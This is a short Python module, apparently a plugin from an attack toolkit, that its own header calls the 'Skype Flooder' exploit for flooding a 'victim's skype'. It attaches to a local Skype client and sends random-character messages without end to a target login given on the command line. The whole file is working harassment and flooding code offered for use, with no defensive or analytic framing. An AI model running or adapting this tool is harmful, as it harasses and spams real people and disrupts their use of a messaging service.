
__NAME__ = 'SF (Skype Flooder)'
__VERS__ = '0.1f'
__DESC__ = 'This exploit flood victim\'s skype'
__AUTHORS__ = [ 'DOCTOR_RABB' ]
__HELP__ = '<target\'s login> <delay>'
__TITLE__ = 'skype_flooder'

from Skype4Py import Skype
from time import sleep
from os import system

from random import randint
from threading import Thread

from sys import path
import os

path.insert (0, os.path.realpath (os.path.dirname (__file__)) + '../../modules/api')

import output_api

def random_all (for_one, length):
    
    char_buffer = '`1234567890-=~!@#$%^&*()_+qwertyuiop[]asdfghjkl;zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:"|ZXCVBNM<>?'
    
    for i in range (for_one + 1):
        out = ''
        if randint (0, 1) == 0:
            for j in range (length + 1):
                out += str (randint (0, 99999999))
        else:
            for j in range (length + 1):
                out += char_buffer [randint (0, len (char_buffer)-1)]
        return out
    
def start_skype ():
    system ('skype')  
    
def run (command_args):
    
    Thread (target=start_skype).start ()
    
    print output_api.INFO + 'Please, wait 2 seconds... (Press Ctrl + C to exit)'
    sleep (2)
    
    client = Skype ()
    client.Attach ()
    
    while True:
        try:
            client.SendMessage(command_args [1], random_all(50, 50))
            print output_api.YES + 'Flood Sent!'
            sleep (int (command_args [2]))
        except KeyboardInterrupt:
            break
        
